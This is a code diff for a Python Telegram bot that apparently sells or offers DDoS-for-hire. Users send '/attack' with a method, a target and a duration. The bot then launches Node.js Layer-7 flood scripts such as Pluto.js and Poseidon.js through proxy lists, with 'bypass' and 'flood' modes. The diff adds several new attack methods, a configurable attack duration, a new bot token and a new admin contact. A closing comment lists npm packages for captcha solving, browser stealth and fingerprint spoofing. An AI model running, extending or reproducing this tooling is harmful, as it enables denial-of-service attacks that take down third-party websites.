@@ -14,7 +14,10 @@ import io
 import re
 import threading
 
-bot_token = '6942224817:AAEITxumizdt_ArqLJikdzRh9eYKycCVJUA'
+from server import alive
+alive()
+
+bot_token = '6508337693:AAEy5Vlirw5hPG2EWW3wP7bEYrltfhhhW-U'
 
 bot = telebot.TeleBot(bot_token)
 
@@ -79,8 +82,6 @@ def help(message):
     help_text = '''
 [ 👻 ]   Welcome to Fracxi | 
         " /methods "Show all available Layer7 methods"
-
-
        [ ✔️ ]   Admin : D4XG | 
 '''
     bot.reply_to(message, help_text)
@@ -91,9 +92,13 @@ def methods(message):
     help_text = '''
 [ 💸 ]   All Layer7 Methods ! 
      - PLUTO
-     - RAW-ALPHA
-     - BROWSER !
-[ 📎 ]   ᴀᴛᴛᴀᴄᴋ ? [ " /attack " + method + target ]  !
+     - PLUTO-CANON
+     - FRIXIZ
+     - OPIUM
+     - GLAXIA
+     - POSEIDON
+     - ZENITH
+[ 📎 ]   ATTACK ? [ " /attack " + method + target + duration ]  !
 '''
     bot.reply_to(message, help_text)
 
@@ -105,13 +110,17 @@ def run_attack(command, duration, message):
     cmd_process = subprocess.Popen(command)
     start_time = time.time()
     
+    # Convert duration from string to float
+    duration = float(duration)
+    
     while cmd_process.poll() is None:
         # Check CPU usage and terminate if it's too high for 10 seconds
         if psutil.cpu_percent(interval=1) >= 1:
             time_passed = time.time() - start_time
-            if time_passed >= 120:
+            if time_passed >= duration:
                 cmd_process.terminate()
-                bot.reply_to(message, "[ 💤 ]   Attack Stopped .")
+                os.chdir('..')
+                bot.reply_to(message, "[ 💤 ]   Attack Stopped.")
                 return
         # Check if the attack duration has been reached
         if time.time() - start_time >= duration:
@@ -129,9 +138,9 @@ def attack_command(message):
     username = message.from_user.username
 
     current_time = time.time()
-    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 150:
-        remaining_time = int(150 - (current_time - cooldown_dict[username].get('attack', 0)))
-        bot.reply_to(message, f"Please wait {remaining_time}(s) To use the command again!")
+    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
+        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
+        bot.reply_to(message, f"Please wait {remaining_time}s To use the command again!")
         return
     
     args = message.text.split()
@@ -140,29 +149,41 @@ def attack_command(message):
     atime = args[3]
 
     blocked_domains = ["chinhphu.vn", "daxg.space", ".edu.vn", ".gov"]   
-    if method == 'TLS-FLOODER' or method == 'TLS-BYPASS':
+    if method == 'PLUTO' or method == 'POSEIDON' or method == 'ZENITH' or method == 'PLUTO-CANON' or method == 'GLAXIA' or method == 'FRIXIZ' or method == 'OPIUM':
         for blocked_domain in blocked_domains:
             if blocked_domain in host:
                 bot.reply_to(message, f"[ 🚀 ]  Cannot perform the attack | Blocked domain: {blocked_domain}")
                 return
 
-    if method in ['PLUTO', 'POSEIDON', 'ZENITH', 'GLAXIA']:
+    if method in ['PLUTO', 'PLUTO-CANON', 'POSEIDON', 'ZENITH', 'GLAXIA', 'FRIXIZ', 'OPIUM']:
         # Update the command and duration based on the selected method
         if method == 'PLUTO':
             os.chdir("L7")
-            command = ["node", "Pluto.js", host, atime, "64", "12", "proxy.txt", "bypass"]
+            command = ["node", "Pluto.js", host, atime, "200", "14", "proxy.txt", "bypass"]
+            duration = atime
+        if method == 'PLUTO-CANON':
+            os.chdir("L7")
+            command = ["node", "Pluto.js", host, atime, "200", "14", "proxy.txt", "flood"]
             duration = atime
         if method == 'POSEIDON':
             os.chdir("L7")
             command = ["node", "Poseidon.js", host, atime, "12", "proxy.txt", "autorate"]
             duration = atime
+        if method == 'OPIUM':
+            os.chdir("L7")
+            command = ["node", "Opium.js", host, atime, "100", "12", "GET", "proxy.txt"]
+            duration = atime
         if method == 'ZENITH':
             os.chdir("L7")
             command = ["node", "Zenith.js", host, atime, "100", "12", "proxy.txt"]
             duration = atime
+        if method == 'FRIXIZ':
+            os.chdir("L7")
+            command = ["node", "Frixiz.js", host, atime, "15", "12", "proxy.txt"]
+            duration = atime
         if method == 'GLAXIA':
             os.chdir("L7")
-            command = ["node", "Poseidon.js", host, atime, "64", "12", "proxy.txt"]
+            command = ["node", "Glaxia.js", host, atime, "64", "12", "proxy.txt"]
             duration = atime
 
         cooldown_dict[username] = {'attack': current_time}
@@ -175,7 +196,7 @@ def attack_command(message):
 
 @bot.message_handler(func=lambda message: message.text.startswith('/'))
 def invalid_command(message):
-    bot.reply_to(message, 'Admin : t.me/xDAXG |')
+    bot.reply_to(message, 'Admin : t.me/prifxz |')
 
 bot.infinity_polling(timeout=60, long_polling_timeout = 1)
 # npm i user-agents header-generator request fake-useragent randomstring colors axios cheerio gradient-string cloudscraper random-useragent crypto-random-string playwright-extra fingerprint-generator fingerprint-injector ua-parser-js http2 minimist socks puppeteer hcaptcha-solver puppeteer-extra puppeteer-extra-plugin-recaptcha puppeteer-extra-plugin-stealth http http2 zombie random-referer jar xmlhttprequest vm set-cookie-parser
